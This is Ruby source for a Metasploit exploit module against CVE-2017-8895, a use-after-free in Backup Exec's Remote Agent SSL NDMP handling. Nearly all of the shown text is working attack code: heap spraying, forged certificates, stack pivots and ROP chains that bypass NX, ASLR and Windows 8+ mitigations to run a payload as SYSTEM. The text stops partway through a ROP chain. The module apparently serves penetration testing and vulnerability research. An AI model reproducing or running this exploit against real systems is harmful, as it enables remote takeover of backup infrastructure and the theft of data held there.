##
# This module requires Metasploit: http://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core/exploit/ndmp_socket'

require 'openssl'
require 'xdr'

class MetasploitModule < Msf::Exploit::Remote
  Rank = NormalRanking

  include Msf::Exploit::Remote::Tcp
  include Msf::Exploit::Remote::NDMPSocket

  def initialize(info={})
    super(update_info(info,
      'Name'           => 'Veritas/Symantec Backup Exec SSL NDMP Connection Use-After-Free',
      'Description'    => %q{
        This module exploits a use-after-free vulnerability in the handling of SSL NDMP
        connections in Veritas/Symantec Backup Exec's Remote Agent for Windows. When SSL
        is re-established on a NDMP connection that previously has had SSL established,
        the BIO struct for the connection's previous SSL session is reused, even though it
        has previously been freed.

        This module supports 3 specific versions of the Backup Exec agent in the 14, 15
        and 16 series on 64-bit and 32-bit versions of Windows and has been tested from
        Vista to Windows 10. The check command can help narrow down what major and minor
        revision is installed and the precise of version of Windows, but some other
        information may be required to make a reliable choice of target.

        NX, ASLR and Windows 8+ anti-ROP mitigations are bypassed. On Windows 8+, it has a
        reliability of around 85%. On other versions of Windows, reliability is around 35%
        (due to the need to win a race condition across the network in this case; this may
        drop further depending on network conditions). The agent is normally installed on
        all hosts in a domain that need to be backed up, so if one service crashes, try
        again on another :) Successful exploitation will give remote code execution as the
        user of the Backup Exec Remote Agent for Windows service, almost always
        NT AUTHORITY\SYSTEM.
      },
      'License'        => MSF_LICENSE,
      'Author'         => [ 'Matthew Daley' ],
      'References'     =>
        [
          [ 'CVE', '2017-8895' ],
          [ 'VTS', '17-006' ],
          [ 'URL', 'https://www.veritas.com/content/support/en_US/security/VTS17-006.html' ]
        ],
      'Platform'       => 'win',
      'Stance'         => Msf::Exploit::Stance::Aggressive,
      'Payload'        =>
        {
          'DisableNops' => true
        },
      'Targets'        =>
        [
          [
            'Backup Exec 14 (14.1 / revision 9.1), Windows >= 8 x64',
            { 'Version' => 14, 'Arch' => ARCH_X64, 'Win8Upwards' => true }
          ],
          [
            'Backup Exec 14 (14.1 / revision 9.1), Windows >= 8 x86',
            { 'Version' => 14, 'Arch' => ARCH_X86, 'Win8Upwards' => true }
          ],
          [
            'Backup Exec 14 (14.1 / revision 9.1), Windows <= 7 x64',
            { 'Version' => 14, 'Arch' => ARCH_X64, 'Win8Upwards' => false }
          ],
          [
            'Backup Exec 14 (14.1 / revision 9.1), Windows <= 7 x86',
            { 'Version' => 14, 'Arch' => ARCH_X86, 'Win8Upwards' => false }
          ],
          [
            'Backup Exec 15 (14.2 / revision 9.2), Windows >= 8 x64',
            { 'Version' => 15, 'Arch' => ARCH_X64, 'Win8Upwards' => true }
          ],
          [
            'Backup Exec 15 (14.2 / revision 9.2), Windows >= 8 x86',
            { 'Version' => 15, 'Arch' => ARCH_X86, 'Win8Upwards' => true }
          ],
          [
            'Backup Exec 15 (14.2 / revision 9.2), Windows <= 7 x64',
            { 'Version' => 15, 'Arch' => ARCH_X64, 'Win8Upwards' => false }
          ],
          [
            'Backup Exec 15 (14.2 / revision 9.2), Windows <= 7 x86',
            { 'Version' => 15, 'Arch' => ARCH_X86, 'Win8Upwards' => false }
          ],
          [
            'Backup Exec 16 (16.0 / revision 9.2), Windows >= 8 x64',
            { 'Version' => 16, 'Arch' => ARCH_X64, 'Win8Upwards' => true }
          ],
          [
            'Backup Exec 16 (16.0 / revision 9.2), Windows >= 8 x86',
            { 'Version' => 16, 'Arch' => ARCH_X86, 'Win8Upwards' => true }
          ],
          [
            'Backup Exec 16 (16.0 / revision 9.2), Windows <= 7 x64',
            { 'Version' => 16, 'Arch' => ARCH_X64, 'Win8Upwards' => false }
          ],
          [
            'Backup Exec 16 (16.0 / revision 9.2), Windows <= 7 x86',
            { 'Version' => 16, 'Arch' => ARCH_X86, 'Win8Upwards' => false }
          ]
        ],
      'DefaultOptions' =>
        {
          'RPORT'              => 10000,
          'NumTriggerAttempts' => 50,
          'EXITFUNC'           => 'thread'
        },
      'Privileged'     => true,
      'DisclosureDate' => 'May 10 2017',
      'DefaultTarget'  => 8))

    register_options([
      OptInt.new('NumSpraySockets',    [ false, 'Number of sockets to spray stage 1 with' ]),
      OptInt.new('NumTLSSpraySockets', [ false, 'Number of sockets to spray TLS extensions with' ]),
      OptInt.new('NumTriggerAttempts', [ true,  'Number of attempts to trigger the vulnerability (Windows 8+ only)' ])
    ])
  end

  def check
    s = NDMP::Socket.new(connect)
    return CheckCode::Unknown unless connect_ndmp(s, 2)

    resp = s.do_request_response(NDMP::Message.new_request(NDMP::Message::CONFIG_GET_HOST_INFO))
    return CheckCode::Unknown unless resp
    info = HostInfoResponse.from_xdr(resp.body)
    print_line('Hostname: ' + info.hostname)
    print_line('OS type: ' + info.os_type)
    print_line('OS version: ' + info.os_version)
    print_line('Host ID: ' + info.host_id)

    disconnect
    s = NDMP::Socket.new(connect)
    return CheckCode::Unknown unless connect_ndmp(s, 3)

    resp = s.do_request_response(NDMP::Message.new_request(NDMP::Message::CONFIG_GET_SERVER_INFO))
    return CheckCode::Unknown unless resp
    info = ServiceInfoResponse.from_xdr(resp.body)
    print_line('Vendor: ' + info.vendor_name)
    print_line('Product: ' + info.product_name)
    print_line('Revision: ' + info.revision_number)

    ver = info.revision_number.split('.')
    if ver[0].to_i < 9 || (ver[0].to_i == 9 && ver[1].to_i <= 2)
      CheckCode::Appears
    else
      CheckCode::Detected
    end
  end

  def exploit
    print_status('Connecting sockets...')

    # Connect a differing amount of sockets for stage 1 spraying depending on the target
    spray_socks = connect_additional_sockets(
      datastore['NumSpraySockets'] || (target.opts['Win8Upwards'] ? 100 : 200),
      target.opts['Arch'] == ARCH_X64 && target.opts['Win8Upwards'] ? 2 : 3
    )

    # Likewise, connect a differing amount of sockets for TLS extension spraying depending
    # on the target
    num_tls_spray_socks = datastore['NumTLSSpraySockets'] || (
      case target.opts['Version']
      when 14
        0
      when 15
        target.opts['Win8Upwards'] && target.opts['Arch'] == ARCH_X86 ? 50 : 100
      when 16
        target.opts['Arch'] == ARCH_X64 ? 100 : 0
      end
    )
    tls_spray_socks = connect_additional_sockets(num_tls_spray_socks, 3)

    s = NDMP::Socket.new(connect)
    unless connect_ndmp(s, 3)
      fail_with(Failure::UnexpectedReply, "Couldn't connect main socket")
    end

    ca_cert, ca_key = generate_ca_cert_and_key
    ca_cert_id = get_cert_id(ca_cert)
    print_status("CA certificate ID = #{ca_cert_id.to_s(16)}")

    print_status('Getting and handling a certificate signing request...')
    agent_cert = handle_a_csr(s, ca_cert, ca_key)
    fail_with(Failure::UnexpectedReply, "Couldn't sign certificate request") if agent_cert.nil?
    print_status("Agent certificate ID = #{get_cert_id(agent_cert).to_s(16)}")

    if target.opts['Win8Upwards'] && target.opts['Arch'] == ARCH_X86 && target.opts['Version'] != 15
      # For certain target types, put the stage 1 spray sockets into SSL mode. We can use
      # the newly made CA certificate and key as our client side certificate
      ssl_context = OpenSSL::SSL::SSLContext.new
      ssl_context.cert = ca_cert
      ssl_context.key = ca_key
      print_status('Entering spray sockets into SSL mode...')
      (1..2).each do |phase|
        spray_socks.each do |ss|
          require_empty_ssl_request(ss, SSLRequest::Opcode.test_cert, ca_cert_id, phase)
          require_empty_ssl_request(ss, SSLRequest::Opcode.start_ssl, ca_cert_id, phase)
          ss.wrap_with_ssl(ssl_context) if phase == 2
        end
      end
    end

    print_status('Testing certificate...')
    require_empty_ssl_request(s, SSLRequest::Opcode.test_cert, ca_cert_id)

    # For some targets, split the spraying of TLS extensions around entering SSL on the
    # main socket
    tls_cutoff = tls_spray_socks.length
    if target.opts['Win8Upwards']
      if target.opts['Arch'] == ARCH_X86
        tls_cutoff /= 2
      end
    else
      tls_cutoff /= 10
    end
    spray_tls_extensions(tls_spray_socks[0...tls_cutoff], ca_cert_id)

    print_status('Entering SSL mode on main socket...')
    require_empty_ssl_request(s, SSLRequest::Opcode.start_ssl, ca_cert_id)

    spray_tls_extensions(tls_spray_socks[tls_cutoff...tls_spray_socks.length], ca_cert_id)

    # Send stages 2 to 4 in a TLS or SSLv2 handshake record. We do this so that the other
    # stages are contained in the SSL socket buffer at the time of the UAF. The record
    # itself could be considered stage 1.5 as stage 1 will pivot to somewhere within the
    # record (depending on the amount of trigger attempts required; see attempt_triggers)
    print_status('Sending stages 2 to 4...')
    if target.opts['Arch'] == ARCH_X64
      if target.opts['Version'] == 14
        # x64, version 14. Use a TLS handshake record
        #
        #   Windows 8+:
        #     Stage 1 jumps to 0x1d or 0x30 + [0, NumTriggerAttempts - 2] * 8
        #          0    1    2    3    4    5    6    7    8    9    A    B    C    D    E    F
        #        +----+----+----+----+----+----+----+----+----+----+----+----+----+----+----+----+
        #      0 | 16 | 03 | 01 | length  | FILLER
        #        +----+----+----+----+----+----+----+----+----+----+----+----+----+----+----+----+
        #     10                                                                  | ret 3
        #        +----+----+----+----+----+----+----+----+----+----+----+----+----+----+----+----+
        #     20                          | ret                                   | FILLER       |
        #        +----+----+----+----+----+----+----+----+----+----+----+----+----+----+----+----+
        #     30 | retsled (0x10 aligned length)...                                              |
        #        +----+----+----+----+----+----+----+----+----+----+----+----+----+----+----+----+
        #     .. | stages 2-4...
        #        +----+----+----+----+----+----+----+----+----+----+----+----+----+----+----+----+
        #
        #   Otherwise:
        #     Stage 1 jumps to 0x18
        #          0    1    2    3    4    5    6    7    8    9    A    B    C    D    E    F
        #        +----+----+----+----+----+----+----+----+----+----+----+----+----+----+----+----+
        #      0 | 16 | 03 | 01 | length  | FILLER
        #        +----+----+----+----+----+----+----+----+----+----+----+----+----+----+----+----+
        #     10                                         | ret                                   |
        #        +----+----+----+----+----+----+----+----+----+----+----+----+----+----+----+----+
        #     20 | stages 2-4...
        #        +----+----+----+----+----+----+----+----+----+----+----+----+----+----+----+----+

        ret = [0xbe6c897].pack('Q<')
        if target.opts['Win8Upwards']
          ret_3 = [0xbe2829b].pack('Q<')
          payload = rand_text(24) + ret_3 + ret + rand_text(3) +
                    ret * [0, (datastore['NumTriggerAttempts'] - 1) & ~1].max
        else
          payload = rand_text(19) + ret
        end
        payload << generate_stages_2_to_4

        stage_tls = generate_tls_handshake_record(payload)
      else
        # x64, version 15/16. Use a SSLv2 hqndshake record
        #   Windows 8+: Stage 1 jumps to 0x23 or 0x38 + [0, NumTriggerAttempts - 2] * 8
        #   Otherwise: Stage 1 jumps to 0x18
        #        0    1    2    3    4    5    6    7    8    9    A    B    C    D    E    F
        #      +----+----+----+----+----+----+----+----+----+----+----+----+----+----+----+----+
        #    0 | length  | 01 | 03 | FILLER
        #      +----+----+----+----+----+----+----+----+----+----+----+----+----+----+----+----+
        #   10                                         | pop x3; ret                           |
        #      +----+----+----+----+----+----+----+----+----+----+----+----+----+----+----+----+
        #   20 | FILLER       | ret 5                                 | ret
        #      +----+----+----+----+----+----+----+----+----+----+----+----+----+----+----+----+
        #   30                | FILLER                 | retsled (0x8 aligned length)...       |
        #      +----+----+----+----+----+----+----+----+----+----+----+----+----+----+----+----+
        #   40 | stages 2 - 4...
        #      +----+----+----+----+----+----+----+----+----+----+----+----+----+----+----+----+

        pop_x3 = [0xbe1d920].pack('Q<')
        ret_5 = [target.opts['Version'] == 15 ? 0xbe61731 : 0xbe62c16].pack('Q<')
        ret = [0xbe6c897].pack('Q<')
        payload = rand_text(20) + pop_x3 + rand_text(3) + ret_5 + ret + rand_text(5) +
                  ret * [1, (datastore['NumTriggerAttempts'] & ~1) - 1].max +
                  generate_stages_2_to_4

        stage_tls = generate_tls_in_sslv2_clienthello(payload)
      end
    else
      if target.opts['Version'] == 14
        # x86, version 14. Use a TLS handshake record
        #   Windows 8+: Stage 1 jumps to 0x9 or 0x14 + [0, NumTriggerAttempts - 2] * 4
        #   Otherwise: Stage 1 jumps to 0x4
        #        0    1    2    3    4    5    6    7    8    9    A    B    C    D    E    F
        #      +----+----+----+----+----+----+----+----+----+----+----+----+----+----+----+----+
        #    0 | 16 | 03 | 01 | ln | pop x3; ret       | FL | ret 3             | ret
        #      +----+----+----+----+----+----+----+----+----+----+----+----+----+----+----+----+
        #   10      | FILLER       | retsled...        | stages 2 to 4...
        #      +----+----+----+----+----+----+----+----+----+----+----+----+----+----+----+----+

        pop_x3 = [0x6311f901].pack('L<')
        ret_3 = [0x6312164a].pack('L<')
        ret = [0x63101514].pack('L<')
        payload = (pop_x3[1...pop_x3.length] + rand_char + ret_3 + ret + rand_text(3) +
                   ret * [0, datastore['NumTriggerAttempts'] - 2].max + generate_stages_2_to_4)

        stage_tls = generate_tls_handshake_record(payload, pop_x3[0])
      else
        # x86, version 15/16. Use a SSLv2 hqndshake record
        #   Windows 8+: Stage 1 jumps to 0xf or 0x14 + [0, NumTriggerAttempts - 2] * 4
        #   Otherwise: Stage 1 jumps to 0x4
        #        0    1    2    3    4    5    6    7    8    9    A    B    C    D    E    F
        #      +----+----+----+----+----+----+----+----+----+----+----+----+----+----+----+----+
        #    0 | length  | 01 | 03 | add esp, 0xc; ret | FILLER                           | inc esp; ret
        #      +----+----+----+----+----+----+----+----+----+----+----+----+----+----+----+----+
        #   10                | FL | retsled...        | stages 2 to 4...
        #      +----+----+----+----+----+----+----+----+----+----+----+----+----+----+----+----+

        add_esp_0xc = [target.opts['Version'] == 15 ? 0x6312890f : 0x6312898f].pack('L<')
        inc_esp = [target.opts['Version'] == 15 ? 0x6311c68c : 0x63137b1b].pack('L<')
        ret = [0x63101564].pack('L<')
        payload = add_esp_0xc + rand_text(7) + inc_esp + rand_char +
                  ret * [0, datastore['NumTriggerAttempts'] - 3].max +
                  generate_stages_2_to_4

        stage_tls = generate_tls_in_sslv2_clienthello(payload)
      end
    end
    s.raw_sendall(stage_tls, 0)
    if target.opts['Version'] == 14
      resp = s.raw_recv(5)
      fail_with(Failure::UnexpectedReply, 'Failed to read TLS handshake response. Are you sure you selected the right target version?') if resp.empty?
      s.raw_recv(resp[3...5].unpack('n')[0])
    end

    print_status('Closing TLS spray sockets...')
    tls_spray_socks.reverse! unless target.opts['Win8Upwards']
    tls_spray_socks.each do |ts|
      ts.close
      sleep(0.1)
    end
    sleep(1)

    # Spray stage 1 in the string payloads of selected NDMP packet types
    if target.opts['Win8Upwards'] && target.opts['Arch'] == ARCH_X64
      spray_payload = XDR::String[].to_xdr(generate_stage_1[0...-1])
      spray_msg_type = NDMP::Message::CONFIG_GET_BUTYPE_ATTR
    else
      spray_payload = XDR::Int.to_xdr(1) + XDR::String[].to_xdr(generate_stage_1[0...-1]) * 2
      spray_msg_type = NDMP::Message::CONNECT_CLIENT_AUTH
    end
    spray_msg = NDMP::Message.new_request(spray_msg_type, spray_payload)

    # We need to be able to detect as soon as a connection is made to the payload in order
    # to stop spraying/trigger attempts ASAP
    @payload_connected = false
    if payload_instance.respond_to?(:handle_connection)
      old_handle_connect = payload_instance.method(:handle_connection)
      payload_instance.define_singleton_method(:handle_connection) do |*args|
        @payload_connected = true
        old_handle_connect.call(*args)
      end
    end

    if target.opts['Win8Upwards']
      # After this SSL request, the BIO struct is freed but still referred to in the new
      # SSL context
      print_status('Re-entering SSL mode on main socket...')
      require_empty_ssl_request(s, SSLRequest::Opcode.start_ssl, ca_cert_id)

      # Attempt to overwrite the BIO struct with stage 1 and trigger the UAF
      attempt_triggers(s, spray_socks, spray_msg)
    else
      # Attempt to overwrite the BIO struct with stage 1 and trigger the UAF in a race
      attempt_race(s, spray_socks, spray_msg, ca_cert_id)
    end

    handler
  end

  private

  SSL_HANDSHAKE_REQUEST = 0xf383

  class SSLRequest < XDR::Struct
    class Opcode < XDR::Enum
      member :test_cert, 1
      member :get_csr_req, 2
      member :give_signed_cert, 3
      member :start_ssl, 4
      seal
    end

    attribute :opcode,            Opcode
    attribute :media_server_name, XDR::String[]
    attribute :media_server_fqdn, XDR::String[]
    attribute :media_server_addr, XDR::String[]
    attribute :cert_id_1,         XDR::Int
    attribute :cert_id_2,         XDR::Int
    attribute :unknown1,          XDR::Int
    attribute :unknown2,          XDR::Int
    attribute :unknown3,          XDR::Int
    attribute :ca_cert,           XDR::String[]
    attribute :unknown4,          XDR::Int
    attribute :agent_cert,        XDR::String[]

    def self.new_for_opcode(opcode)
      new(
        :opcode            => opcode,
        :media_server_name => 'foo',
        :media_server_fqdn => 'foo',
        :media_server_addr => 'foo',
        :cert_id_1         => 0,
        :cert_id_2         => 0,
        :unknown1          => 0,
        :unknown2          => 0,
        :unknown3          => 0,
        :ca_cert           => '',
        :unknown4          => 0,
        :agent_cert        => ''
      )
    end
  end

  class SSLResponse < XDR::Struct
    attribute :unknown1, XDR::Int
    attribute :unknown2, XDR::String[]
    attribute :unknown3, XDR::Int
    attribute :unknown4, XDR::String[]

    def empty?
      (attributes[:unknown1].zero? && attributes[:unknown2].empty? &&
       attributes[:unknown3].zero? && attributes[:unknown4].empty?)
    end
  end

  class ServiceInfoResponse < XDR::Struct
    attribute :error,           XDR::Int
    attribute :vendor_name,     XDR::String[]
    attribute :product_name,    XDR::String[]
    attribute :revision_number, XDR::String[]
    attribute :auth_types,      XDR::VarArray[XDR::Int]
  end

  class HostInfoResponse < XDR::Struct
    attribute :error,      XDR::Int
    attribute :hostname,   XDR::String[]
    attribute :os_type,    XDR::String[]
    attribute :os_version, XDR::String[]
    attribute :host_id,    XDR::String[]
    attribute :unknown,    XDR::VarArray[XDR::Int]
  end

  #
  # Perform NDMP connection handshake on a NDMP socket. Can be split into 3 stages.
  #
  def connect_ndmp(s, version, phase=nil)
    if phase.nil? || phase == 1
      return false unless s.read_ndmp_msg(NDMP::Message::NOTIFY_CONNECTED)
    end

    if phase.nil? || phase == 2
      return false unless s.prepare_and_write_ndmp_msg(
        NDMP::Message.new_request(NDMP::Message::CONNECT_OPEN, XDR::Int.to_xdr(version))
      )
    end

    if phase.nil? || phase == 3
      msg = s.read_ndmp_msg(NDMP::Message::CONNECT_OPEN)
      return false unless msg
      fail_with(Failure::UnexpectedReply, 'Bad connect result') unless XDR::Int.from_xdr(msg.body).zero?
    end

    true
  end

  #
  # Connect multiple NDMP sockets of a given version. Parallelizes over connection phases.
  #
  def connect_additional_sockets(num_socks, version)
    socks = (0...num_socks).map do
      NDMP::Socket.new(connect(false))
    end

    (1..3).each do |phase|
      socks.each do |ss|
        unless connect_ndmp(ss, version, phase)
          fail_with(Failure::UnexpectedReply, "Couldn't connect NDMP socket (phase #{phase})")
        end
      end
    end

    socks
  end

  #
  # Send a Backup Exec-specific SSL NDMP request and receive the response.
  #
  def do_simple_ssl_request(s, opcode, ca_cert_id, phase=nil)
    if phase.nil? || phase == 1
      req = SSLRequest.new_for_opcode(opcode)
      req.cert_id_1 = req.cert_id_2 = ca_cert_id
      msg = NDMP::Message.new_request(SSL_HANDSHAKE_REQUEST, req.to_xdr)

      if block_given?
        last = s.prepare_and_write_ndmp_msg(msg, true)
        return nil unless last
        sleep(1)
        yield true
        s.raw_sendall(last, 0)
        yield false
      else
        return nil unless s.prepare_and_write_ndmp_msg(msg)
      end
    end

    if phase.nil? || phase == 2
      msg = s.read_ndmp_msg(SSL_HANDSHAKE_REQUEST)
      return msg ? SSLResponse.from_xdr(msg.body) : nil
    end

    nil
  end

  #
  # Send a Backup Exec SSL NDMP request and receive the response, requiring the response
  # to be empty.
  #
  def require_empty_ssl_request(s, opcode, ca_cert_id, phase=nil)
    resp = do_simple_ssl_request(s, opcode, ca_cert_id, phase)
    if phase.nil? || phase == 2
      fail_with(Failure::UnexpectedReply, "Failed to perform SSL request/response (opcode #{opcode})") unless resp
      fail_with(Failure::UnexpectedReply, "Non-empty SSL response (opcode #{opcode}) result") unless resp.empty?
    end
  end

  #
  # Get the ID Backup Exec uses to identify a x509 certificate. This is the first 4 bytes
  # of the SHA-1 of the issuer and the raw serial number.
  #
  def get_cert_id(cert)
    Digest::SHA1.digest(cert.issuer.to_s + cert.serial.to_s(2))[0...4].unpack('L<')[0]
  end

  #
  # Create a self-signed CA certificate and matching key.
  #
  def generate_ca_cert_and_key(key_len=2048)
    ca_key = OpenSSL::PKey::RSA.new(key_len)

    ca_cert = OpenSSL::X509::Certificate.new
    ca_cert.version    = 3
    ca_cert.serial     = 1
    ca_cert.subject    = ca_cert.issuer = OpenSSL::X509::Name.parse('/CN=SSL UAF')
    ca_cert.not_before = Time.now - 60 * 60 * 24
    ca_cert.not_after  = Time.now + 60 * 60 * 24 * 365
    ca_cert.public_key = ca_key.public_key

    extn_factory = OpenSSL::X509::ExtensionFactory.new(ca_cert, ca_cert)
    ca_cert.extensions = [
      extn_factory.create_extension('subjectKeyIdentifier', 'hash'),
      extn_factory.create_extension('basicConstraints', 'critical,CA:true')
    ]
    # Have to do this after creating subjectKeyIdentifier extension
    ca_cert.add_extension(extn_factory.create_extension('authorityKeyIdentifier', 'keyid:always,issuer'))

    ca_cert.sign(ca_key, OpenSSL::Digest::SHA256.new)

    [ca_cert, ca_key]
  end

  #
  # Get and handle a certificate signing request from Backup Exec with the given CA
  # certificate and key.
  #
  def handle_a_csr(s, ca_cert, ca_key)
    resp = do_simple_ssl_request(s, SSLRequest::Opcode.get_csr_req, 0)
    return nil if resp.nil?
    request = OpenSSL::X509::Request.new(resp.unknown2)

    agent_cert = OpenSSL::X509::Certificate.new
    agent_cert.version    = 3
    agent_cert.serial     = 2
    agent_cert.subject    = request.subject
    agent_cert.issuer     = ca_cert.subject
    agent_cert.not_before = Time.now - 60 * 60 * 24
    agent_cert.not_after  = Time.now + 60 * 60 * 24 * 365
    agent_cert.public_key = request.public_key

    extn_factory = OpenSSL::X509::ExtensionFactory.new(ca_cert, agent_cert)
    agent_cert.extensions = [
      extn_factory.create_extension('subjectKeyIdentifier', 'hash'),
      extn_factory.create_extension('basicConstraints', 'critical,CA:false')
    ]
    # Have to do this after creating subjectKeyIdentifier extension
    agent_cert.add_extension(extn_factory.create_extension('authorityKeyIdentifier', 'keyid:always,issuer'))

    agent_cert.sign(ca_key, OpenSSL::Digest::SHA256.new)

    req = SSLRequest.new_for_opcode(SSLRequest::Opcode.give_signed_cert)
    req.ca_cert = ca_cert.to_s
    req.agent_cert = agent_cert.to_s
    return nil unless s.do_request_response(NDMP::Message.new_request(SSL_HANDSHAKE_REQUEST, req.to_xdr))

    agent_cert
  end

  #
  # Generate a TLS handshake record with the given payload.
  #
  def generate_tls_handshake_record(payload, required_fifth_byte=nil)
    fail_with(Failure::Unknown, 'No payload') if payload.empty?

    # Stage 1 for the x86 version 14 target jumps into the TLS header itself (at offset
    # 0x4) instead of in non-header data; here it's necessary to control the 5th byte of
    # the header, which is the second byte of the length word
    unless required_fifth_byte.nil?
      payload << rand_text((required_fifth_byte.ord - (payload.length & 0xff)) % 0x100)
    end
    "\x16\x03\x01" + [payload.length].pack('n') + payload
  end

  #
  # Generate a TLS ClientHello record with the given Random and extensions (ie. for
  # holding stages 2-4).
  #
  def generate_tls_clienthello(curves_extn_payload, ec_formats_extn_payload, random)
    if ec_formats_extn_payload.empty? && curves_extn_payload.empty?
      fail_with(Failure::Unknown, 'No TLS extension payloads given')
    end
    if ec_formats_extn_payload.length > 0xff
      fail_with(Failure::Unknown, 'Bad EC formats extension length')
    end
    if curves_extn_payload.length.odd? || curves_extn_payload.length > 0xffff
      fail_with(Failure::Unknown, 'Bad curves extension length')
    end
    if random.length != 0x20
      fail_with(Failure::Unknown, 'Bad random length')
    end

    extns = ''
    unless curves_extn_payload.empty?
      extns << [
        10,
        curves_extn_payload.length + 2,
        curves_extn_payload.length
      ].pack('n*') + curves_extn_payload
    end
    unless ec_formats_extn_payload.empty?
      extns << [
        11,
        ec_formats_extn_payload.length + 1,
        ec_formats_extn_payload.length
      ].pack('nnC') + ec_formats_extn_payload
    end

    r = "\x03\x03" + random + "\x00\x00\x02\x00\x2f\x01\x00"
    r << [extns.length].pack('n') + extns

    r = "\x01" + [r.length].pack('N')[1...4] + r

    generate_tls_handshake_record(r)
  end

  #
  # Generate a TLS ClientHello record in a SSLv2 record with a given payload.
  #
  def generate_tls_in_sslv2_clienthello(payload)
    fail_with(Failure::Unknown, 'No payload') if payload.empty?
    fail_with(Failure::Unknown, 'Bad first byte') unless payload[0].ord >= 1

    r = "\x01\x03" + payload
    [r.length | 0x8000].pack('n') + r
  end

  #
  # Spray a bunch of TLS extensions from the given NDMP sockets. Used for heap feng shui.
  #
  def spray_tls_extensions(tls_spray_socks, ca_cert_id)
    payload_len = target.opts['Arch'] == ARCH_X64 ? 0x68 : 0x40
    spray = generate_tls_clienthello(rand_text(payload_len), rand_text(payload_len), rand_text(0x20))

    print_status('Spraying TLS extensions...')
    (1..2).each do |phase|
      tls_spray_socks.each do |ts|
        require_empty_ssl_request(ts, SSLRequest::Opcode.test_cert, ca_cert_id, phase)
        require_empty_ssl_request(ts, SSLRequest::Opcode.start_ssl, ca_cert_id, phase)

        if phase == 2
          ts.raw_sendall(spray, 0)
          sleep(0.1)
        end
      end
    end
    sleep(1)
  end

  #
  # Generate stage 1.
  #
  # This stage is what overwrites the freed BIO struct. It consists of a non-zero readable
  # location (to prevent Backup Exec from falling over or failing) and a stack pivot to
  # some offset from the current SSL socket buffer read location, which will hold a
  # TLS/SSLv2 record (from the previous SSL connection) holding stages 2-4. The pivot
  # offset will be different at each UAF trigger attempt; see attempt_triggers).
  #
  def generate_stage_1
    if target.opts['Arch'] == ARCH_X64
      stage_1 = [
        # +0x18 from here is a non-zero, readable location. This is the load address of
        # becrypto.dll (which is non-ASLR)
        0xbe00000,
        # On x64, we pivot into the current SSL socket buffer read location + 0x18
        # lea rsp, qword ptr [rbp + 0x10]; pop rbp; ret
        [0xbe5ecf2, 0xbe23261, 0xbe2329b][target.opts['Version'] - 14]
      ].pack('Q<*')
    else
      stage_1 = [
        # +0x18 from here is a non-zero, readable location. This is the load address of
        # becrypto.dll (which is non-ASLR)
        0x63100000,
        # On x86, we pivot into the current SSL socket buffer read location + 0x4
        # mov esp, ebp; pop ebp; ret
        target.opts['Version'] == 14 ? 0x631017fd : 0x6310184d
      ].pack('L<*')
    end
    stage_1 + rand_text((target.opts['Arch'] == ARCH_X64 ? 0x68 : 0x40) - stage_1.length)
  end

  #
  # Generate stages 2 to 4.
  #
  # Stage 2 is a ROP chain that copies stages 3 and 4 from the heap (that stage 1 pivoted
  # to) onto the stack, bypassing Windows 8+'s check before certain functions (like
  # VirtualProtect) that we have called them from within expected stack memory instead of
  # the heap.
  #
  # Stage 3 is a ROP chain that calls VirtualProtect to mark stages 3 and 4 as executable
  # (but we only really need stage 4 executable anyway).
  #
  # Stage 4 is the user-selected Metasploit payload code.
  #
  def generate_stages_2_to_4
    stage_4 = payload.encoded

    if target.opts['Arch'] == ARCH_X64
      if target.opts['Version'] == 14
        stage_3 = [
          0,         # skipped by stage 2
          0xbe31359, # push rax; pop rsi; ret
          0xbe01f72, # pop rax; ret
          0,
          0xbe3d250, # add rax, rcx; ret
          0xbe1c2f9, # pop r12; ret
          0xbe2ab32, # pop r8; ret
          0xbe2987c, # mov rcx, rax; call r12
          0xbe46d9e, # jmp qword ptr [KERNEL32!LoadLibraryW]
          0xbe4e511, # pop r14; pop r13; pop rdi; pop rbp; ret
          0,
          0,
          0,
          0,
          0xbe37f75, # push rax; pop rdi; ret
          0xbe43b25, # mov rcx, rsi; call r12
          0xbe01f72, # pop rax; ret
          0,
          0xbe3d250, # add rax, rcx; ret
          0xbe6949a, # push rax; pop r12; ret
          0xbe4f7ec, # pop r14; pop r13; ret
          0xbe2ab32, # pop r8; ret
          0,
          0xbe2f917, # mov rdx, r12; mov ecx, 4; call r14
          0xbe01f72, # pop rax; ret
          0xbe2ab32, # pop r8; ret
          0xbe36e8e, # mov rcx, rdi; call rax
          0xbe01a29, # ret
          0xbe46d32, # jmp qword ptr [KERNEL32!GetProcAddressStub]
          0xbe4e511, # pop r14; pop r13; pop rdi; pop rbp; ret
          0,
          0,
          0,
          0,
          0xbe37f75, # push rax; pop rdi; ret
          0xbe1c2f9, # pop r12; ret
          0xbe2ab32, # pop r8; ret
          0xbe43b25, # mov rcx, rsi; call r12
          0xbe399d0, # pop r13; ret
          1 << 31,
          0xbe33c3e, # mov rdx, r13; call r12
          0xbe6b790, # mov r9, rcx; test edx, edx; jns 0xbe6b7a3; xor eax, eax; ret
          0xbe399d0, # pop r13; ret
          0,
          0xbe33c3e, # mov rdx, r13; call r12
          0xbe2ab32, # pop r8; ret
          0x40,      # PAGE_EXECUTE_READWRITE
          0xbe01a29, # ret
          0xbe5180b, # jmp rdi
          0xbe4e511, # pop r14; pop r13; pop rdi; pop rbp; ret
          0,
          0,
          0,
          0,
          0xbe63938  # push rsp; ret
        ]
        stage_3[3] = stage_3[43] = stage_3.length * 8 + stage_4.length
        kernel32_dll = "KERNEL32.dll\0".encode('UTF-16LE').force_encoding('ASCII-8BIT')
        stage_3[17] = stage_3[3] + kernel32_dll.length
        stage_3 = stage_3.pack('Q<*') + stage_4 + kernel32_dll + "VirtualProtect\0"
      elsif target.opts['Version'] == 15
        stage_3 = [
          0xbe68a34, # push rax; pop rbx; ret
          0xbe087c8, # pop rax; ret
          0,
          0xbe60dc0, # add rax, rcx; ret
          0xbe9b627, # mov rcx, rax; call r12
          0xbe4929d, # ret
          0xbeb488e, # jmp qword ptr [KERNEL32!LoadLibraryAStub]
          0xbea47f9, # pop r15; pop r14; pop r13; pop rbp; ret
          0,
          0,
          0,
          0,
          0xbe34c0c, # push rax; pop rbp; ret
          0xbefc534, # mov rcx, rbx; call r12
          0xbe087c8, # pop rax; ret
          0,
          0xbe60dc0, # add rax, rcx; ret
          0xbe9b627, # mov rcx, rax; call r12
          0xbefc526, # mov rdx, rcx; call r12
          0xbe9ad68, # mov rcx, rbp; call r12
          0xbeb4828, # jmp qword ptr [KERNEL32!GetProcAddressStub]
          0xbea47f9, # pop r15; pop r14; pop r13; pop rbp; ret
          0,
          0,
          0,
          0,
